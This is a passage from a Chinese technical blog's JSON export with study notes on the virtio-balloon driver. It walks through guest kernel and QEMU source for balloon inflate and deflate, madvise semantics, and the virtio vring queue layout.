class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>所有device维护在bus这个数据结构中</p>\n<p><code>mdev_device_create</code> 创建device</p>\n<p>对于qemu的info操作 似乎并不会触发内核的函数 如何通过一个接口看一下时间？</p>\n<p>在update size函数中 如果无变化返回之前 加入print</p>\n<p>即想查看的时候同样用修改的接口 输入一个不变的值即可</p>\n<p>从结果来看比较准确且稳定</p>\n<p>fill_balloon会从内核模块alloc page 表示已经拿了这个page 所以guest kernel没法用了</p>\n<p>leak_balloon释放这个page</p>\n<h3 id=\"fill\"><a href=\"#fill\" class=\"headerlink\" title=\"fill\"></a>fill</h3><h4 id=\"guest\"><a href=\"#guest\" class=\"headerlink\" title=\"guest\"></a>guest</h4><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> page *<span class=\"title function_\">balloon_page_alloc</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> *<span class=\"title\">page</span> =</span> alloc_page(balloon_mapping_gfp_mask() |</span><br><span class=\"line\">\t\t\t\t       __GFP_NOMEMALLOC | __GFP_NORETRY);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> page;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">unsigned</span> <span class=\"title function_\">fill_balloon</span><span class=\"params\">(<span class=\"keyword\">struct</span> virtio_balloon *vb, <span class=\"type\">size_t</span> num)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> num_allocated_pages;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> num_pfns;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> *<span class=\"title\">page</span>;</span></span><br><span class=\"line\">\tLIST_HEAD(pages);</span><br><span class=\"line\">\tnum = min(num, ARRAY_SIZE(vb-&gt;pfns));</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (num_pfns = <span class=\"number\">0</span>; num_pfns &lt; num;</span><br><span class=\"line\">\t     num_pfns += VIRTIO_BALLOON_PAGES_PER_PAGE) &#123;</span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> *<span class=\"title\">page</span> =</span> balloon_page_alloc();</span><br><span class=\"line\">\t\t...</span><br><span class=\"line\">\t\t<span class=\"comment\">//local list 和balloon_page_pop对应 只是一次性全部alloc而已</span></span><br><span class=\"line\">\t\tballoon_page_push(&amp;pages, page);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tmutex_lock(&amp;vb-&gt;balloon_lock);</span><br><span class=\"line\">\tvb-&gt;num_pfns = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> ((page = balloon_page_pop(&amp;pages))) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//把这次拿到的page全部加入balloon中</span></span><br><span class=\"line\">\t\tballoon_page_enqueue(&amp;vb-&gt;vb_dev_info, page);</span><br><span class=\"line\">\t\tset_page_pfns(vb, vb-&gt;pfns + vb-&gt;num_pfns, page);</span><br><span class=\"line\">\t\tvb-&gt;num_pages += VIRTIO_BALLOON_PAGES_PER_PAGE;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!virtio_has_feature(vb-&gt;vdev,</span><br><span class=\"line\">\t\t\t\t\tVIRTIO_BALLOON_F_DEFLATE_ON_OOM))</span><br><span class=\"line\">            <span class=\"comment\">//如果没开DEFLATE_ON_OOM guest内核可用的page是减少的</span></span><br><span class=\"line\">\t\t\tadjust_managed_page_count(page, <span class=\"number\">-1</span>);</span><br><span class=\"line\">\t\tvb-&gt;num_pfns += VIRTIO_BALLOON_PAGES_PER_PAGE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tnum_allocated_pages = vb-&gt;num_pfns;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (vb-&gt;num_pfns != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\ttell_host(vb, vb-&gt;inflate_vq);</span><br><span class=\"line\">\tmutex_unlock(&amp;vb-&gt;balloon_lock);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> num_allocated_pages;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>[<a href=\"https://blog.csdn.net/u010923083/article/details/115873669\">内核内存] 伙伴系统4—alloc_pages(内存块分配)_早起的虫儿有鹰吃的博客-CSDN博客</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">tell_host</span><span class=\"params\">(<span class=\"keyword\">struct</span> virtio_balloon *vb, <span class=\"keyword\">struct</span> virtqueue *vq)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">scatterlist</span> <span class=\"title\">sg</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> len;</span><br><span class=\"line\">\tsg_init_one(&amp;sg, vb-&gt;pfns, <span class=\"keyword\">sizeof</span>(vb-&gt;pfns[<span class=\"number\">0</span>]) * vb-&gt;num_pfns);</span><br><span class=\"line\">\tvirtqueue_add_outbuf(vq, &amp;sg, <span class=\"number\">1</span>, vb, GFP_KERNEL);</span><br><span class=\"line\">\tvirtqueue_kick(vq);</span><br><span class=\"line\">\twait_event(vb-&gt;acked, virtqueue_get_buf(vq, &amp;len));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">bool</span> <span class=\"title function_\">virtqueue_notify</span><span class=\"params\">(<span class=\"keyword\">struct</span> virtqueue *_vq)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">vring_virtqueue</span> *<span class=\"title\">vq</span> =</span> to_vvq(_vq);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (unlikely(vq-&gt;broken))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!vq-&gt;notify(_vq)) &#123;</span><br><span class=\"line\">\t\tvq-&gt;broken = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">bool</span> <span class=\"title function_\">vp_notify</span><span class=\"params\">(<span class=\"keyword\">struct</span> virtqueue *vq)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"comment\">/* we write the queue&#x27;s selector into the notification register to</span></span><br><span class=\"line\"><span class=\"comment\">\t * signal the other end */</span></span><br><span class=\"line\">    <span class=\"comment\">// value, addr</span></span><br><span class=\"line\">\tiowrite16(vq-&gt;index, (<span class=\"type\">void</span> __iomem *)vq-&gt;priv);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里wait_event是一个宏 传入的第二个参数会一直被调用然后sleep</p>\n<p>相当于</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">for(;;)&#123;</span><br><span class=\"line\">\tif (virtqueue_get_buf(vq, &amp;len))</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\tschedule();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"qemu\"><a href=\"#qemu\" class=\"headerlink\" title=\"qemu\"></a>qemu</h4><p>virtio:<a href=\"https://blog.csdn.net/xidianjiapei001/article/details/89293914\">IO虚拟化 - virtio介绍及代码分析【转】_xidianjiapei001的博客-CSDN博客</a></p>\n<p><a href=\"https://www.cnblogs.com/edver/category/1939743.html\">虚拟化 - 随笔分类 - Edver - 博客园 (cnblogs.com)</a></p>\n<p>virtqueue初始化过程：</p>\n<p>virtio_pci_legacy_probe 初始化回调函数</p>\n<p><code>virtballoon_probe</code>-&gt;<code>init_vqs</code>-&gt;<code>virtio_find_vqs</code>-&gt;<code>find_vqs(vp_find_vqs)</code>-&gt;<code>vp_find_vqs_msix</code>-&gt;<code>vp_setup_vq(setup_vq)</code>-&gt;<code>vring_create_virtqueue</code></p>\n<p><a href=\"https://www.cnblogs.com/edver/p/14684117.html\">virtio简介（三） —— virtio-balloon qemu设备创建 - Edver - 博客园 (cnblogs.com)</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">virtio_balloon_device_realize</span><span class=\"params\">(DeviceState *dev, Error **errp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    VirtIODevice *vdev = VIRTIO_DEVICE(dev);</span><br><span class=\"line\">    VirtIOBalloon *s = VIRTIO_BALLOON(dev);</span><br><span class=\"line\">    <span class=\"type\">int</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">    virtio_init(vdev, VIRTIO_ID_BALLOON, virtio_balloon_config_size(s));</span><br><span class=\"line\"></span><br><span class=\"line\">    ret = qemu_add_balloon_handler(virtio_balloon_to_target,</span><br><span class=\"line\">                                   virtio_balloon_stat, s);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ret &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        error_setg(errp, <span class=\"string\">&quot;Only one balloon device is supported&quot;</span>);</span><br><span class=\"line\">        virtio_cleanup(vdev);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (virtio_has_feature(s-&gt;host_features, VIRTIO_BALLOON_F_FREE_PAGE_HINT) &amp;&amp;</span><br><span class=\"line\">        !s-&gt;iothread) &#123;</span><br><span class=\"line\">        error_setg(errp, <span class=\"string\">&quot;&#x27;free-page-hint&#x27; requires &#x27;iothread&#x27; to be set&quot;</span>);</span><br><span class=\"line\">        virtio_cleanup(vdev);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    s-&gt;ivq = virtio_add_queue(vdev, <span class=\"number\">128</span>, virtio_balloon_handle_output);</span><br><span class=\"line\">    s-&gt;dvq = virtio_add_queue(vdev, <span class=\"number\">128</span>, virtio_balloon_handle_output);</span><br><span class=\"line\">    s-&gt;svq = virtio_add_queue(vdev, <span class=\"number\">128</span>, virtio_balloon_receive_stats);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">virtio_queue_notify_vq</span><span class=\"params\">(VirtQueue *vq)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (vq-&gt;vring.desc &amp;&amp; vq-&gt;handle_output) &#123;</span><br><span class=\"line\">        VirtIODevice *vdev = vq-&gt;vdev;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (unlikely(vdev-&gt;broken)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        trace_virtio_queue_notify(vdev, vq - vdev-&gt;vq, vq);</span><br><span class=\"line\">        vq-&gt;handle_output(vdev, vq);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (unlikely(vdev-&gt;start_on_kick)) &#123;</span><br><span class=\"line\">            virtio_set_started(vdev, <span class=\"literal\">true</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">virtio_balloon_handle_output</span><span class=\"params\">(VirtIODevice *vdev, VirtQueue *vq)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    VirtIOBalloon *s = VIRTIO_BALLOON(vdev);</span><br><span class=\"line\">    VirtQueueElement *elem;</span><br><span class=\"line\">    MemoryRegionSection section;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">        PartiallyBalloonedPage pbp = &#123;&#125;;</span><br><span class=\"line\">        <span class=\"type\">size_t</span> offset = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> pfn;</span><br><span class=\"line\"></span><br><span class=\"line\">        elem = virtqueue_pop(vq, <span class=\"keyword\">sizeof</span>(VirtQueueElement));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!elem) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (iov_to_buf(elem-&gt;out_sg, elem-&gt;out_num, offset, &amp;pfn, <span class=\"number\">4</span>) == <span class=\"number\">4</span>) &#123;</span><br><span class=\"line\">            <span class=\"type\">unsigned</span> <span class=\"type\">int</span> p = virtio_ldl_p(vdev, &amp;pfn);</span><br><span class=\"line\">            hwaddr pa;</span><br><span class=\"line\"></span><br><span class=\"line\">            pa = (hwaddr) p &lt;&lt; VIRTIO_BALLOON_PFN_SHIFT;</span><br><span class=\"line\">            offset += <span class=\"number\">4</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            section = memory_region_find(get_system_memory(), pa,</span><br><span class=\"line\">                                         BALLOON_PAGE_SIZE);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!section.mr) &#123;</span><br><span class=\"line\">                trace_virtio_balloon_bad_addr(pa);</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!memory_region_is_ram(section.mr) ||</span><br><span class=\"line\">                memory_region_is_rom(section.mr) ||</span><br><span class=\"line\">                memory_region_is_romd(section.mr)) &#123;</span><br><span class=\"line\">                trace_virtio_balloon_bad_addr(pa);</span><br><span class=\"line\">                memory_region_unref(section.mr);</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            trace_virtio_balloon_handle_output(memory_region_name(section.mr),</span><br><span class=\"line\">                                               pa);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!virtio_balloon_inhibited()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (vq == s-&gt;ivq) &#123;</span><br><span class=\"line\">                    balloon_inflate_page(s, section.mr,</span><br><span class=\"line\">                                         section.offset_within_region, &amp;pbp);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (vq == s-&gt;dvq) &#123;</span><br><span class=\"line\">                    balloon_deflate_page(s, section.mr, section.offset_within_region);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    g_assert_not_reached();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            memory_region_unref(section.mr);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        virtqueue_push(vq, elem, <span class=\"number\">0</span>);</span><br><span class=\"line\">        virtio_notify(vdev, vq);</span><br><span class=\"line\">        g_free(elem);</span><br><span class=\"line\">        virtio_balloon_pbp_free(&amp;pbp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>inflate操作是guest会立即把内存还给host</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">balloon_inflate_page</span><span class=\"params\">(VirtIOBalloon *balloon,</span></span><br><span class=\"line\"><span class=\"params\">                                 MemoryRegion *mr, hwaddr mr_offset,</span></span><br><span class=\"line\"><span class=\"params\">                                 PartiallyBalloonedPage *pbp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">void</span> *addr = memory_region_get_ram_ptr(mr) + mr_offset;</span><br><span class=\"line\">    <span class=\"type\">ram_addr_t</span> rb_offset, rb_aligned_offset, base_gpa;</span><br><span class=\"line\">    RAMBlock *rb;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> rb_page_size;</span><br><span class=\"line\">    <span class=\"type\">int</span> subpages;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* XXX is there a better way to get to the RAMBlock than via a</span></span><br><span class=\"line\"><span class=\"comment\">     * host address? */</span></span><br><span class=\"line\">    rb = qemu_ram_block_from_host(addr, <span class=\"literal\">false</span>, &amp;rb_offset);</span><br><span class=\"line\">    rb_page_size = qemu_ram_pagesize(rb);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (rb_page_size == BALLOON_PAGE_SIZE) &#123;</span><br><span class=\"line\">        <span class=\"comment\">/* Easy case */</span></span><br><span class=\"line\"></span><br><span class=\"line\">        ram_block_discard_range(rb, rb_offset, rb_page_size);</span><br><span class=\"line\">        <span class=\"comment\">/* We ignore errors from ram_block_discard_range(), because it</span></span><br><span class=\"line\"><span class=\"comment\">         * has already reported them, and failing to discard a balloon</span></span><br><span class=\"line\"><span class=\"comment\">         * page is not fatal */</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t...<span class=\"comment\">//经过测试 基本都是easy case</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>ram_block_discard_range会调madvice</p>\n<blockquote>\n<p>MADV_WILLNEED<br>Expect access in the near future. (Hence, it might be a good idea to read some pages ahead.)</p>\n<p>MADV_DONTNEED<br>Do not expect access in the near future. (For the time being, the application is finished with the given range, so the kernel can free resources associated with it.) Subsequent accesses of pages in this range will succeed, but will result either in reloading of the memory contents from the underlying mapped file (see mmap(2)) or zero-fill-on-demand pages for mappings without an underlying file.<br>MADV_REMOVE (Since Linux 2.6.16)<br>Free up a given range of pages and its associated backing store. Currently, only shmfs&#x2F;tmpfs supports this; other file systems return with the error ENOSYS.</p>\n</blockquote>\n<p>经过尝试后发现 <strong>通过mmap拿的内存 madvise <code>MADV_DONTNEED</code> 是会立即被回收的</strong></p>\n<p>实际上这里一定需要unmap ept 否则需要相信guest kernel不会访问已经被释放的页 但是VMM不相信VM</p>\n<p>这里没有手动unmap的原因是 madvise之后 内核如果真的free page 也需要修改自己的页表 并且调用mmu notify 最终通知kvm <code>kvm_mmu_notifier_invalidate_range_start</code>host上加输出可以看到</p>\n<p>mm&#x2F;madvise.c </p>\n<p><code>do_madvise</code>-&gt;<code>madvise_vma_behavior</code>-&gt;<code>madvise_dontneed_free</code>-&gt;<code>madvise_dontneed_single_vma</code>-&gt;<code>zap_page_range</code>-&gt;</p>\n<p><code>mmu_notifier_invalidate_range_start</code> 解kvm ept</p>\n<p><code>unmap_single_vma</code> 解kernel</p>\n<p>这里只是unmap 但是并没有free掉相应的物理内存(修改page元数据 还给buddy system) 那不还是用不了？</p>\n<blockquote>\n<p>成功执行<strong>MADV_DONTNEED</strong>操作之后，访问指定区域的语义将发生变化：后续访问这些页面将会成功，但是会导致从底层映射文件中重新填充内容(用于共享文件映射、共享匿名映射及shmem等)或者导致私有映射的零填充按需页面。因此此操作是直接将page给回收了，从对私有映射的处理来看，与swap还是略微不同的。</p>\n<p>需要注意的是，当应用于共享映射时，<strong>MADV_DONTNEED</strong> 可能不会立即释放范围内的页面。内核可以自由地选择合适的时机来释放页面。然而，调用进程的常驻集大小 (RSS) 将立即减少。</p>\n<p>作者：蟹蟹宁<br>链接：<a href=\"https://www.jianshu.com/p/965b1ed71ae4\">https://www.jianshu.com/p/965b1ed71ae4</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>\n</blockquote>\n<h3 id=\"leak\"><a href=\"#leak\" class=\"headerlink\" title=\"leak\"></a>leak</h3><p>用的是inflate存下来的page 一模一样的</p>\n<p>其实deflate是无所谓的 根据现有的所有机制 VM想用就用就行了</p>\n<p>qemu</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">virtio_balloon_handle_output</span><span class=\"params\">(VirtIODevice *vdev, VirtQueue *vq)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    VirtIOBalloon *s = VIRTIO_BALLOON(vdev);</span><br><span class=\"line\">    VirtQueueElement *elem;</span><br><span class=\"line\">    MemoryRegionSection section;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">        PartiallyBalloonedPage pbp = &#123;&#125;;</span><br><span class=\"line\">        <span class=\"type\">size_t</span> offset = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> pfn;</span><br><span class=\"line\"></span><br><span class=\"line\">        elem = virtqueue_pop(vq, <span class=\"keyword\">sizeof</span>(VirtQueueElement));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!elem) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (iov_to_buf(elem-&gt;out_sg, elem-&gt;out_num, offset, &amp;pfn, <span class=\"number\">4</span>) == <span class=\"number\">4</span>) &#123;</span><br><span class=\"line\">            <span class=\"type\">unsigned</span> <span class=\"type\">int</span> p = virtio_ldl_p(vdev, &amp;pfn);</span><br><span class=\"line\">            hwaddr pa;</span><br><span class=\"line\"></span><br><span class=\"line\">            pa = (hwaddr) p &lt;&lt; VIRTIO_BALLOON_PFN_SHIFT;</span><br><span class=\"line\">            offset += <span class=\"number\">4</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            section = memory_region_find(get_system_memory(), pa,</span><br><span class=\"line\">                                         BALLOON_PAGE_SIZE);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!section.mr) &#123;</span><br><span class=\"line\">                trace_virtio_balloon_bad_addr(pa);</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!memory_region_is_ram(section.mr) ||</span><br><span class=\"line\">                memory_region_is_rom(section.mr) ||</span><br><span class=\"line\">                memory_region_is_romd(section.mr)) &#123;</span><br><span class=\"line\">                trace_virtio_balloon_bad_addr(pa);</span><br><span class=\"line\">                memory_region_unref(section.mr);</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            trace_virtio_balloon_handle_output(memory_region_name(section.mr),</span><br><span class=\"line\">                                               pa);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!virtio_balloon_inhibited()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (vq == s-&gt;ivq) &#123;</span><br><span class=\"line\">                    balloon_inflate_page(s, section.mr,</span><br><span class=\"line\">                                         section.offset_within_region, &amp;pbp);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (vq == s-&gt;dvq) &#123;</span><br><span class=\"line\">                    balloon_deflate_page(s, section.mr, section.offset_within_region);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    g_assert_not_reached();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            memory_region_unref(section.mr);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        virtqueue_push(vq, elem, <span class=\"number\">0</span>);</span><br><span class=\"line\">        virtio_notify(vdev, vq);</span><br><span class=\"line\">        g_free(elem);</span><br><span class=\"line\">        virtio_balloon_pbp_free(&amp;pbp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">balloon_deflate_page</span><span class=\"params\">(VirtIOBalloon *balloon,</span></span><br><span class=\"line\"><span class=\"params\">                                 MemoryRegion *mr, hwaddr mr_offset)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">void</span> *addr = memory_region_get_ram_ptr(mr) + mr_offset;</span><br><span class=\"line\">    <span class=\"type\">ram_addr_t</span> rb_offset;</span><br><span class=\"line\">    RAMBlock *rb;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> rb_page_size;</span><br><span class=\"line\">    <span class=\"type\">void</span> *host_addr;</span><br><span class=\"line\">    <span class=\"type\">int</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* XXX is there a better way to get to the RAMBlock than via a</span></span><br><span class=\"line\"><span class=\"comment\">     * host address? */</span></span><br><span class=\"line\">    rb = qemu_ram_block_from_host(addr, <span class=\"literal\">false</span>, &amp;rb_offset);</span><br><span class=\"line\">    rb_page_size = qemu_ram_pagesize(rb);</span><br><span class=\"line\"></span><br><span class=\"line\">    host_addr = (<span class=\"type\">void</span> *)((<span class=\"type\">uintptr_t</span>)addr &amp; ~(rb_page_size - <span class=\"number\">1</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* When a page is deflated, we hint the whole host page it lives</span></span><br><span class=\"line\"><span class=\"comment\">     * on, since we can&#x27;t do anything smaller */</span></span><br><span class=\"line\">    ret = qemu_madvise(host_addr, rb_page_size, QEMU_MADV_WILLNEED);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ret != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        warn_report(<span class=\"string\">&quot;Couldn&#x27;t MADV_WILLNEED on balloon deflate: %s&quot;</span>,</span><br><span class=\"line\">                    strerror(errno));</span><br><span class=\"line\">        <span class=\"comment\">/* Otherwise ignore, failing to page hint shouldn&#x27;t be fatal */</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>wait_event在include&#x2F;linux&#x2F;wait.h</p>\n<p>___wait_event</p>\n","categories":["virtualization"]},{"title":"virtio queue","url":"/2024/09/17/virtualization/virtio%20queue/","content":"<h1 id=\"virtio-queue\"><a href=\"#virtio-queue\" class=\"headerlink\" title=\"virtio queue\"></a>virtio queue</h1><h2 id=\"消息机制\"><a href=\"#消息机制\" class=\"headerlink\" title=\"消息机制\"></a>消息机制</h2><p><a href=\"https://blog.csdn.net/wangquan1992/article/details/120649182\">virtio-net 实现机制_sg_init_one_老王不让用的博客-CSDN博客</a></p>\n<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>简单设计：一个环形队列 固定大小 生产者消费者 两个指针</p>\n<p>这样所有通信固定在了这个队列里</p>\n<p>virtio可以动态申请和释放共享内存，用一块固定的共享内存队列记录通信使用的共享内存的地址</p>\n<p>这个队列为desc 默认128长度</p>\n<p>真正的共享内存是scatterlist</p>\n<p>并且 desc并不是单纯的先进先出的队列，而是一个无序的链表，所有请求不需要顺序处理 所以两个指针是不够的 必须记录哪些位置是新生产的  哪些位置被消费了</p>\n<p>实现中用数组 分别索引</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">vring_create_virtqueue</span><br><span class=\"line\">vring_create_virtqueue_split</span><br><span class=\"line\">vring_alloc_queue_split</span><br><span class=\"line\">\t-&gt; vring_split-&gt;vring.desc = vring_alloc_queue(num)</span><br></pre></td></tr></table></figure>\n\n<p>前者是avai ring qemu把新请求的desc id放在里面  然后更新这个avai ring的index</p>\n<p>qemu会维护这个avai ring的last index 然后avai_ring[last_index]读到desc id desc[desc_id]读到真正的信息的共享内存地址 然后再读数据 </p>\n<p>同理 use ring表示另一侧</p>\n<p>实现中 desc avail used用的是一块连续的物理内存</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">vstatic <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title function_\">vring_init</span><span class=\"params\">(<span class=\"keyword\">struct</span> vring *vr, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> num, <span class=\"type\">void</span> *p,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t      <span class=\"type\">unsigned</span> <span class=\"type\">long</span> align)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tvr-&gt;num = num;</span><br><span class=\"line\">\tvr-&gt;desc = p;</span><br><span class=\"line\">\tvr-&gt;avail = (<span class=\"keyword\">struct</span> vring_avail *)((<span class=\"type\">char</span> *)p + num * <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> vring_desc));</span><br><span class=\"line\">\tvr-&gt;used = (<span class=\"type\">void</span> *)(((<span class=\"type\">uintptr_t</span>)&amp;vr-&gt;avail-&gt;ring[num] + 